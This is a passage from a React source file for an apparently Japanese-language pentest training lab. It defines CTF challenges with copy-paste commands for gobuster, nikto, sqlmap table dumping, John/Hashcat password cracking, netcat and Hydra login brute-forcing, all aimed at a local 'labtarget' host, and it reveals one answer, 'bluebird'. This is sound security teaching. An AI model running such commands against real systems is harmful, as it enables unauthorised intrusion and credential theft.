        hint: 'Applications → Sniffing - Spoofing → wireshark から起動し、File → Openで `~/TerminalBox-Labs/capture.pcapng` を開きます。上部の表示フィルターへ `http` と入力してEnterを押し、残ったパケットを選択します。中央ペインのHypertext Transfer Protocolを展開し、`X-Training-Flag` ヘッダーの値を探します。GUIが使えない場合は提示コマンドの `-r` がPCAP読込、`-Y http` がHTTPだけの表示、`-V` が詳細表示です。',
        result: '`X-Training-Flag` の値を回答します。',
      },
      {
        id: '03', title: 'Gobuster', answerId: 'gobuster',
        goal: '専用辞書を使って公開されていないディレクトリとFlagファイルを発見してください。',
        commands: ['gobuster dir -u http://labtarget:3100 -w ~/TerminalBox-Labs/directories.txt -x txt', 'curl http://labtarget:3100/internal-backup/flag.txt'],
        hint: 'Applications → Web Application Analysis → gobuster からターミナル版を起動するか、提示コマンドを実行します。`dir` はディレクトリ探索、`-u` は対象URL、`-w` は候補辞書、`-x txt` は各候補へ `.txt` も追加して調べる指定です。結果のStatus 200または301の行から隠しディレクトリ名を確認し、その配下の `flag.txt` をブラウザーまたは `curl` で開きます。探索はこの演習用URLと配布辞書だけに限定してください。',
        result: '発見したファイル内の `TBX{...}` を回答します。',
      },
      {
        id: '04', title: 'Nikto', answerId: 'nikto',
        goal: 'Webサーバーをスキャンし、公開されたサーバーステータスと危険なHTTP設定を確認してください。',
        commands: ['nikto -h http://labtarget:3100 -maxtime 2m', 'curl http://labtarget:3100/server-status'],
        hint: 'Applications → Vulnerability Analysis → nikto から起動するか、提示コマンドを実行します。`-h` は検査対象、`-maxtime 2m` は最長2分で終了する指定です。出力を上から読み、`/server-status` が公開されているという行と、許可されている危険なHTTPメソッドの指摘を確認します。その後 `curl http://labtarget:3100/server-status` で実際の公開ページを取得し、ページ内の `TBX{...}` を探します。',
        result: 'サーバーステータスにある `TBX{...}` を回答します。',
      },
      {
        id: '05', title: 'sqlmap', answerId: 'sqlmap',
        goal: '商品検索の `q` パラメータを検査し、SQLiteの `secrets` テーブルからFlagを取得してください。',
        commands: ["sqlmap -u 'http://labtarget:3100/sql/search?q=apple' -p q --dbms=SQLite --batch --tables", "sqlmap -u 'http://labtarget:3100/sql/search?q=apple' -p q --dbms=SQLite --batch -T secrets --dump"],
        hint: 'Applications → Database Assessment → sqlmap から起動するか、1本目の提示コマンドを実行します。`-u` は検査するURL、`-p q` は `q` パラメータだけを検査、`--dbms=SQLite` はDB種別、`--batch` は質問へ既定値で自動回答する指定です。`--tables` の結果に `secrets` があることを確認したら、2本目の `-T secrets --dump` でそのテーブルだけを表示します。表示された行の `training_flag` 列を回答します。',
        result: '`training_flag` の値を回答します。',
      },
      {
        id: '06', title: 'John the Ripper', answerId: 'john',
        goal: 'raw MD5形式の漏えいハッシュを専用辞書で復元してください。',
        commands: ['john --format=raw-md5 --wordlist=~/TerminalBox-Labs/passwords.txt ~/TerminalBox-Labs/john.hash', 'john --show --format=raw-md5 ~/TerminalBox-Labs/john.hash'],
        hint: 'Applications → Password Attacks → john から起動するか、1本目の提示コマンドを実行します。`--format=raw-md5` はハッシュ形式、`--wordlist` は試す候補語のファイル、最後の引数は解析対象のハッシュファイルです。完了後に2本目の `john --show` を実行すると `ユーザー名:平文パスワード` の形式で結果を再表示できます。解答欄には `TBX{...}` ではなく、復元された平文パスワードだけを入力します。',
        result: '復元したパスワードを回答します。',
      },
      {
        id: '07', title: 'Hashcat', answerId: 'hashcat',
        goal: 'SHA-256ハッシュを辞書攻撃で復元してください。GPUを使わず、短時間で終わる教材です。',
        commands: ['hashcat -m 1400 -a 0 ~/TerminalBox-Labs/hashcat.sha256 ~/TerminalBox-Labs/passwords.txt --potfile-path ~/TerminalBox-Labs/hashcat.pot', 'hashcat -m 1400 ~/TerminalBox-Labs/hashcat.sha256 --show --potfile-path ~/TerminalBox-Labs/hashcat.pot'],
        hint: 'Applications → Password Attacks → hashcat から起動するか、1本目の提示コマンドを実行します。`-m 1400` はSHA-256、`-a 0` は辞書攻撃で、ハッシュファイルの各値に対して配布辞書の候補を試します。`--potfile-path` には復元結果が保存されるため、再実行時にも同じファイルを指定してください。解析後に2本目の `--show` を実行し、`ハッシュ:平文パスワード` のコロンより後ろを回答します。',
        result: '復元したパスワードを回答します。',
      },
      {
        id: '08', title: 'Netcat', answerId: 'netcat',
        goal: 'TCPサービスへ接続し、表示された独自プロトコルの指示に従ってFlagを取得してください。',
        commands: ["printf 'FLAG PLEASE\\n' | nc labtarget 4100"],
        hint: 'Applications → Information Gathering → netcat からターミナル版を起動するか、まず `nc labtarget 4100` を実行します。接続後に表示される案内を読み、`FLAG PLEASE` と入力してEnterを押してください。提示コマンドは `printf` で同じ文字列と改行を作り、パイプ `|` でNetcatへ渡す一括実行版です。接続先はWebページではなく生のTCPサービスなので、URLの `http://` は付けません。',
        result: 'TCPサービスが返した `TBX{...}` を回答します。',
      },
      {
        id: '09', title: 'Hydra', answerId: 'hydra',
        goal: 'ユーザー `analyst` のパスワードを小さな専用辞書で検証し、ログイン後のFlagを取得してください。',
        commands: ["hydra -l analyst -P ~/TerminalBox-Labs/hydra-passwords.txt labtarget -s 3100 http-post-form '/hydra/login:username=^USER^&password=^PASS^:F=Invalid credentials' -t 2 -f", "curl -d 'username=analyst&password=bluebird' http://labtarget:3100/hydra/login"],
        hint: 'Applications → Password Attacks → hydra から起動するか、1本目の提示コマンドを実行します。`-l analyst` は固定ユーザー、`-P` はパスワード辞書、`-s 3100` は接続ポート、`http-post-form` の文字列は送信先・フォーム項目・失敗時の文言を表します。`^USER^` と `^PASS^` はHydraが候補へ置換し、`-t 2` は同時試行2件、`-f` は発見時に終了する指定です。成功行でパスワードが `bluebird` と分かったら、2本目のcurlを実行してログインレスポンスのFlagを取得します。',
        result: 'ログイン成功レスポンスの `TBX{...}` を回答します。',
      },
      {
        id: '10', title: 'Metasploit Framework', answerId: 'metasploit',
        goal: 'TerminalBox専用Auxiliary Scannerを実行し、TargetからFlagを取得してください。',
        commands: ['msfconsole -q -x "use auxiliary/scanner/http/terminalbox_flag; set RHOSTS labtarget; set RPORT 3100; run; exit -y"'],
        hint: 'Applications → Exploit Frameworks → metasploit-framework から `msfconsole` を起動できます。対話操作する場合は `use auxiliary/scanner/http/terminalbox_flag` で専用Scannerを選択し、`set RHOSTS labtarget`、`set RPORT 3100`、`run` の順に入力します。提示コマンドの `-q` はバナーを省略し、`-x` はこの一連の操作を自動実行する指定です。結果の `[+]` で始まる成功行から `TBX{...}` を確認します。この教材はpayloadやreverse shellを使わず、演習環境内のHTTP Scannerだけを実行します。',
        result: '`[+]` の行に表示された `TBX{...}` を回答します。',
      },
    ],
  },
];

export function ChallengePanel({ onInsertCommand, resetSignal, targetId, onTargetChange, scope }: Props) {
  const availableGroups = scope === 'tools'
    ? challengeGroups.filter((item) => item.id === 'tools')
    : scope === 'vulnerabilities'
      ? challengeGroups.filter((item) => typeof item.id === 'number')
      : challengeGroups.filter((item) => typeof item.id === 'number' && item.id <= 5);
  const group = (scope !== 'tools' ? availableGroups.find((item) => item.id === targetId) : null) ?? availableGroups[0];
  const [selectedId, setSelectedId] = useState(group.challenges[0].id);
  const [queuedCommand, setQueuedCommand] = useState<string | null>(null);
  const [completedIds, setCompletedIds] = useState<string[]>([]);
  const [answer, setAnswer] = useState('');
  const [choiceAnswer, setChoiceAnswer] = useState<string[]>([]);
  const [checking, setChecking] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [hintVisible, setHintVisible] = useState(false);
  const [choiceShuffleSeed, setChoiceShuffleSeed] = useState(() => `${Date.now()}:${Math.random()}`);
  const completedSet = useMemo(() => new Set(completedIds), [completedIds]);
  const challenge = group.challenges.find((item) => item.id === selectedId) ?? group.challenges[0];
  const completionId = `${group.id}:${challenge.id}`;
  const completed = completedSet.has(completionId);
  const scoredChallenges = group.challenges;
  const groupCompleted = scoredChallenges.filter((item) => completedSet.has(`${group.id}:${item.id}`)).length;
  const answerCompletionIds = useMemo(
    () => group.challenges.filter((item) => item.answerId).map((item) => `${group.id}:${item.id}`),
    [group],
  );
  const nonAnswerCompletionIds = useMemo(
    () => group.challenges.filter((item) => !item.answerId).map((item) => `${group.id}:${item.id}`),
    [group],
  );
  const visibleChoices = useMemo(
    () => shuffledChoices(challenge.choices, `${choiceShuffleSeed}:${group.id}:${challenge.id}`),
    [challenge.choices, challenge.id, choiceShuffleSeed, group.id],
  );

  const loadProgress = useCallback(async () => {
    const response = await fetch('/api/challenges/progress', { credentials: 'include', cache: 'no-store' });
    if (!response.ok) return;
    const result = await response.json();
    if (Array.isArray(result.completedIds)) {
      setCompletedIds(result.completedIds.filter((id: unknown): id is string => typeof id === 'string'));
    }
  }, []);

  const setCompletion = useCallback(async (nextCompletionId: string, nextCompleted: boolean) => {
    setCompletedIds((current) => {
      if (nextCompleted) return current.includes(nextCompletionId) ? current : [...current, nextCompletionId];
      return current.filter((id) => id !== nextCompletionId);
    });
    const response = await fetch('/api/challenges/progress', {
      method: 'POST',
      credentials: 'include',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ completionId: nextCompletionId, completed: nextCompleted }),
    });
    if (!response.ok) await loadProgress();
  }, [loadProgress]);

  useEffect(() => { void loadProgress(); }, [loadProgress, resetSignal]);
  useEffect(() => { setSelectedId(group.challenges[0].id); setQueuedCommand(null); setAnswer(''); setChoiceAnswer([]); setFeedback(''); }, [group]);
  useEffect(() => { setSelectedId(group.challenges[0].id); setAnswer(''); setChoiceAnswer([]); setFeedback(''); }, [group, resetSignal]);
  useEffect(() => { setChoiceShuffleSeed(`${Date.now()}:${Math.random()}`); }, [resetSignal]);
  useEffect(() => setHintVisible(false), [selectedId, resetSignal]);
  useEffect(() => {
    if ((scope !== 'targets' && scope !== 'vulnerabilities') || answerCompletionIds.length === 0) return;
    if (!answerCompletionIds.every((item) => completedSet.has(item))) return;
    const missing = nonAnswerCompletionIds.filter((item) => !completedSet.has(item));
    if (missing.length === 0) return;
    void Promise.all(missing.map((item) => setCompletion(item, true)));
  }, [answerCompletionIds, completedSet, nonAnswerCompletionIds, scope, setCompletion]);

  const queueCommand = (command: string) => {
    onInsertCommand(command);
    setQueuedCommand(command);
    window.setTimeout(() => setQueuedCommand((current) => current === command ? null : current), 1400);
  };

  const checkAnswer = async () => {
    const answerPayload = challenge.choices ? choiceAnswer.join(',') : answer;
    if (!challenge.answerId || !answerPayload.trim()) return;
    setChecking(true);
    setFeedback('');
    try {
      const response = await fetch('/api/challenges/check', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ id: challenge.answerId, answer: answerPayload, completionId }),
      });
      const result = await response.json();
      if (!response.ok) throw new Error(result.error || `HTTP ${response.status}`);
      setFeedback(result.message);
      if (result.correct) {
        if (Array.isArray(result.completedIds)) {
          setCompletedIds(result.completedIds.filter((id: unknown): id is string => typeof id === 'string'));
        } else {
          setCompletedIds((current) => current.includes(completionId) ? current : [...current, completionId]);
        }
      }
    } catch (error) {
      setFeedback(error instanceof Error ? error.message : '回答の確認に失敗しました。');
    } finally {
      setChecking(false);
    }
  };

  const clearChallenge = () => {
    void setCompletion(completionId, false);
    setAnswer('');
    setChoiceAnswer([]);
    setFeedback('');
  };

  const toggleChoice = (choiceId: string) => {
    setChoiceAnswer((current) => {
      if (!challenge.multiple) return [choiceId];
      return current.includes(choiceId) ? current.filter((item) => item !== choiceId) : [...current, choiceId].sort();
    });
  };

  return (
    <section className="panel tutorial-panel challenge-panel" id="challenge-panel" role="tabpanel" aria-labelledby={scope === 'tools' ? 'tools-tab' : scope === 'vulnerabilities' ? 'vulnerabilities-tab' : 'targets-tab'}>
      <div className="panel-heading">
        <h2>{group.subtitle}</h2>
        <span className="ai-badge">{groupCompleted}/{scoredChallenges.length || group.challenges.length} CLEAR</span>
      </div>
      {scope === 'targets' && <div className="challenge-target-tabs" role="tablist" aria-label="ターゲット問題を選択">
        {availableGroups.map((item) => {
          if (typeof item.id !== 'number') return null;
          const itemId = item.id;
          return (
            <button key={itemId} type="button" role="tab" aria-selected={itemId === targetId} className={itemId === targetId ? 'active' : ''} onClick={() => onTargetChange(itemId)}>
              {item.title}
            </button>
          );
        })}
      </div>}
      {scope === 'vulnerabilities' && <div className="vulnerability-target-tabs" aria-label="脆弱性カテゴリ">
        {(['Web', 'Linux / OS'] as const).map((category) => (
          <div key={category} className="vulnerability-category">
            <span>{category}</span>
            <div className="challenge-target-tabs" role="tablist" aria-label={`${category}のTargetを選択`}>
              {availableGroups.filter((item) => item.category === category).map((item) => {
                if (typeof item.id !== 'number') return null;
                const itemId = item.id;
                return (
                  <button key={itemId} type="button" role="tab" aria-selected={itemId === targetId} className={itemId === targetId ? 'active' : ''} onClick={() => onTargetChange(itemId)}>
                    {item.title}
                  </button>
                );
              })}
            </div>
          </div>
        ))}
      </div>}
      <div className="tutorial-body">
        <nav className="lesson-list" aria-label={`${group.title}の一覧`}>
          {group.challenges.map((item) => {
            const itemCompletionId = `${group.id}:${item.id}`;
            return (
              <button key={item.id} type="button" className={`${item.id === selectedId ? 'active' : ''} ${completedSet.has(itemCompletionId) ? 'completed' : ''}`} onClick={() => { setSelectedId(item.id); setAnswer(''); setChoiceAnswer([]); setFeedback(''); }}>
                <span>{completedSet.has(itemCompletionId) ? '✓' : item.id}</span>{item.title}
              </button>
            );
          })}
        </nav>
        <article className="lesson-detail">
          <div className="lesson-title-row">
            <div><span className="eyebrow">{group.title.toUpperCase()} / QUESTION {challenge.id}</span><h3>{challenge.title}</h3></div>
            <div className="lesson-title-status">
              {scope !== 'targets' && <button type="button" className="lesson-clear-button" disabled={!completed} onClick={clearChallenge}>クリア解除</button>}
              <span className={`lesson-clear-badge ${completed ? 'cleared' : ''}`}>{completed ? 'クリア済み' : '未クリア'}</span>
            </div>
          </div>
          <p>{challenge.goal}</p>
          {challenge.answerId ? (
            <div className="challenge-answer">
              {challenge.choices ? (
                <div className="choice-list" role={challenge.multiple ? 'group' : 'radiogroup'} aria-label="選択肢">
                  {visibleChoices.map((choice, index) => (
                    <label key={choice.id} className="choice-option">
                      <input
                        type={challenge.multiple ? 'checkbox' : 'radio'}
                        name={`${completionId}-choice`}
                        checked={choiceAnswer.includes(choice.id)}
                        disabled={completed || checking}
                        onChange={() => toggleChoice(choice.id)}
                      />
                      <span>{String.fromCharCode(65 + index)}. {choice.label}</span>
                    </label>
                  ))}
                </div>
              ) : (
                <input aria-label="問題の回答" value={answer} disabled={completed || checking} placeholder="Flagまたは復元したパスワード" onChange={(event) => setAnswer(event.target.value)} onKeyDown={(event) => { if (event.key === 'Enter') void checkAnswer(); }} />
              )}
              <button type="button" disabled={completed || checking || !(challenge.choices ? choiceAnswer.length : answer.trim())} onClick={() => void checkAnswer()}>{checking ? '確認中...' : completed ? '正解' : '回答する'}</button>
              {feedback && <p className={completed ? 'correct' : 'incorrect'} role="status">{feedback}</p>}
            </div>
          ) : (
            scope === 'targets' || scope === 'vulnerabilities' ? (
              <div className="lesson-card lesson-check"><span>PROGRESS</span><p>この手順は確認用です。ATTACK / UNDERSTAND / DEFEND がすべて正解すると自動でCLEARになります。</p></div>
            ) : (
              <div className="lesson-actions">
                <button type="button" disabled={completed} onClick={() => void setCompletion(completionId, true)}>クリアにする</button>
                <button type="button" className="secondary" disabled={!completed} onClick={clearChallenge}>クリア解除</button>
              </div>
            )
          )}
          <div className="command-stack" aria-label="問題で使うコマンド">
            {challenge.commands.map((command) => (
              <button key={command} type="button" onClick={() => queueCommand(command)}><code>{command}</code><span>{queuedCommand === command ? 'PASTED' : 'PASTE'}</span></button>
            ))}
          </div>
          <button type="button" className={`hint-toggle ${challenge.stage ? `stage-${challenge.stage}` : ''}`} aria-expanded={hintVisible} onClick={() => setHintVisible((current) => !current)}>
            <span>HINT</span><strong>{hintVisible ? 'ヒントを隠す' : 'ヒントを表示'}</strong>
          </button>
          {hintVisible && <div className="lesson-card lesson-hint"><p>{challenge.hint}</p></div>}
          <div className="lesson-card lesson-check"><span>CHECK</span><p>{challenge.result}</p></div>
        </article>
      </div>
    </section>
  );
}
